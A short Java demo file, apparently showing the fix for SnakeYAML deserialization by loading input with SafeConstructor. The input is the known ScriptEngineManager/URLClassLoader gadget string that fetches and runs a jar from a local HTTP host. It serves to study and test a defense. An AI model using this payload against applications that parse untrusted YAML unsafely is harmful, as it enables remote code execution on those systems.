package SnakeYamlFix;

import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

public class SnakeYamlFix {
    public static void main(String[] args) {

                String context = "!!javax.script.ScriptEngineManager [\n" +
                        "  !!java.net.URLClassLoader [[\n" +
                        "    !!java.net.URL [\"http://127.0.0.1:7777/yaml-payload-master.jar\"]\n" +
                        "  ]]\n" +
                        "]";
                Yaml yaml = new Yaml(new SafeConstructor());
                yaml.load(context);
            }

}
